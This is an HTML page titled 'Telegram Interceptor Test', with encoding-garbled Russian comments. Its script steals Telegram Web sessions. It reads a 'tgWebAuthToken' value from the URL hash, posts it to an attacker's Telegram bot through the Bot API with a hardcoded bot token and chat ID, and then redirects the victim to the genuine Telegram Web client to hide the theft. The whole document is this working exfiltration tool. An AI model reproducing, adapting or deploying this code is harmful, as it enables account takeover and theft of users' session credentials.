<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Interceptor Test</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; padding: 20px; }
        .log { background: #f0f0f0; padding: 10px; border-radius: 5px; margin: 10px 0; white-space: pre-wrap; word-break: break-all; }
        .success { color: green; }
        .error { color: red; }
    </style>
</head>
<body>
    <h2>üîç –û—Ç–ª–∞–¥–∫–∞ –ø–µ—Ä–µ—Ö–≤–∞—Ç–∞</h2>
    <div id="log" class="log">–û–∂–∏–¥–∞–Ω–∏–µ...</div>

    <script>
        // –¢–í–û–ò –î–ê–ù–ù–´–ï (–≤—Å—Ç–∞–≤—å —Å–≤–æ–∏)
        const BOT_TOKEN = '8327315514:AAEdAYU0qOhXU6QOK9yFBGx-SO5FNev2Sl4'; // —Ç–≤–æ–π —Ç–æ–∫–µ–Ω
        const CHAT_ID = '8220267007'; // —Ç–≤–æ–π chat id

        const logDiv = document.getElementById('log');
        function addLog(text, isError = false) {
            logDiv.innerHTML += (isError ? '‚ùå ' : '‚úÖ ') + text + '<br>';
        }

        addLog('–°–∫—Ä–∏–ø—Ç –∑–∞–ø—É—â–µ–Ω');

        // –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ Telegram WebApp
        if (window.Telegram && window.Telegram.WebApp) {
            let tg = window.Telegram.WebApp;
            tg.ready();
            addLog('Telegram WebApp –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–Ω');
        } else {
            addLog('Telegram WebApp –ù–ï –î–û–°–¢–£–ü–ï–ù (–æ—Ç–∫—Ä—ã—Ç–æ –Ω–µ –≤–Ω—É—Ç—Ä–∏ Telegram)', true);
        }

        // –ü–æ–ª—É—á–∞–µ–º —Ç–µ–∫—É—â–∏–π URL –∏ —Ö–µ—à
        const currentUrl = window.location.href;
        const hash = window.location.hash;

        addLog('URL: ' + currentUrl);
        addLog('–•–µ—à: ' + (hash || '–ø—É—Å—Ç–æ'));

        if (hash && hash.includes('tgWebAuthToken')) {
            addLog('üîë –ù–ê–ô–î–ï–ù –¢–û–ö–ï–ù: ' + hash.substring(0, 50) + '...');

            // --- –ü–æ–ø—ã—Ç–∫–∞ 1: –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —á–µ—Ä–µ–∑ tg.sendData() ---
            if (window.Telegram && window.Telegram.WebApp) {
                try {
                    window.Telegram.WebApp.sendData(hash);
                    addLog('–î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã —á–µ—Ä–µ–∑ WebApp');
                } catch (e) {
                    addLog('–û—à–∏–±–∫–∞ WebApp.sendData: ' + e.message, true);
                }
            }

            // --- –ü–æ–ø—ã—Ç–∫–∞ 2: –æ—Ç–ø—Ä–∞–≤–∏—Ç—å —á–µ—Ä–µ–∑ fetch (–ø—Ä—è–º–æ–π –∑–∞–ø—Ä–æ—Å –∫ –±–æ—Ç—É) ---
            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: 'üîê –¢–æ–∫–µ–Ω: ' + hash
                })
            })
            .then(res => res.json())
            .then(data => {
                if (data.ok) addLog('–°–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ —á–µ—Ä–µ–∑ fetch');
                else addLog('–û—à–∏–±–∫–∞ fetch: ' + JSON.stringify(data), true);
            })
            .catch(err => addLog('–û—à–∏–±–∫–∞ fetch: ' + err.message, true));

            // –ü–µ—Ä–µ–Ω–∞–ø—Ä–∞–≤–ª–µ–Ω–∏–µ —á–µ—Ä–µ–∑ 5 —Å–µ–∫—É–Ω–¥ (—á—Ç–æ–±—ã —É–≤–∏–¥–µ—Ç—å –ª–æ–≥–∏)
            setTimeout(() => {
                window.location.href = 'https://web.telegram.org/k/';
            }, 5000);
        } else {
            addLog('–¢–æ–∫–µ–Ω–∞ –Ω–µ—Ç, —Ä–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞ Telegram...');
            setTimeout(() => {
                window.location.href = 'https://web.telegram.org/k/';
            }, 2000);
        }
    </script>
</body>
</html>
